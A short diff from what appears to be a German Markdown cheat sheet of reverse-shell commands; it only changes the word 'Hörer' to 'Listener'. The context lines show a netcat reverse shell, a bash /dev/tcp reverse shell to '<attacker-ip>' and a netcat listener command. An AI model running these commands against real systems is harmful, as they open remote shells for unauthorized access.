@@ -158,7 +158,7 @@ nc <attacker-ip> 4444 -e /bin/bash
 ```bash
 bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
 ```
-> ⚠️ Hörer vorbereiten mit:
+> ⚠️ Listener vorbereiten mit:
 ```bash 
 nc -lvnp 4444
 ```
